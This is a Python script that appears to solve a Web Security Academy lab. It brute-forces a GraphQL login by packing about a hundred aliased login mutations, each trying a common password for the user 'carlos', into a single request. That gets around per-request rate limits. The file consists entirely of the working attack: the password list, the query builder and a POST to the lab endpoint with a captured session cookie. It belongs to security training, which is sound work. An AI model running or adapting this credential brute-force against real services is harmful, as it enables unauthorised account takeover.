import requests

alias ="bruteForceLogin"
passwords = """
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
""".split("\n")
passwords = [p.strip() for p in passwords if p.strip()]
template = """
    alias_login%s:login(input: {password: "%s", username: "carlos"}) {
        token
        success
    }
"""
query = f"""mutation {alias} {{"""
for i, password in enumerate(passwords):
    query += template % (i, password)
query += "}"
print(query)


burp0_url = "https://0a21001003ff4b6d809d264300bc0004.web-security-academy.net:443/graphql/v1"
burp0_cookies = {"session": "o4OXaDaMBvVealiuTjCjP03t7vem2ws2"}
burp0_headers = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Accept": "application/json", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Origin": "https://0a21001003ff4b6d809d264300bc0004.web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0a21001003ff4b6d809d264300bc0004.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}
burp0_json={"operationName": "bruteForceLogin", "query": query}
response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
print(response.text)
